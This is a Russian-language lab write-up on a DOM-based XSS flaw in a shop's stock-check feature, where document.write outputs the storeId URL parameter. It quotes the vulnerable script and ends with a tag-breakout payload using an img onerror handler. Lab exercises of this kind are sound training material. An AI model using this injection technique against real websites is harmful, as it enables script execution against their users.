Эта лаборатория содержит уязвимость сценариев на основе DOM **в функциональности чека количества**. Он использует JavaScript `document.write` Функция, которая записывает данные на страницу. А `document.write` Функция вызывается с данными из `location.search` который вы можете управлять с помощью URL -адреса веб -сайта. Данные заключены в элемент выбора.

## Дано 



## Задача

# Разведка

- при просмотре функции чека количества товара видим
```
<script>
	var stores = ["London","Paris","Milan"];
	var store = (new URLSearchParams(window.location.search)).get('storeId');
	document.write('<select name="storeId">');
	if(store) {
		document.write('<option selected>'+store+'</option>');
	}
	for(var i=0;i<stores.length;i++) {
		if(stores[i] === store) {
			continue;
		}
		document.write('<option>'+stores[i]+'</option>');
	}

	document.write('</select>');
</script>
```

# Атака

- при чеке количества видим источник [window.location.search](https://developer.mozilla.org/en-US/docs/Web/API/Location/search) который является уязвимым 
	 `&storeId=test` - тем самым внедрили test
	 ![[Pasted image 20250128153710.png]]

- Выходим из тегов `</option></select>test`
![[Pasted image 20250128154138.png]]

- `&storeId=</option></select><img src="0" onerror="alert('XSS Attack!')">`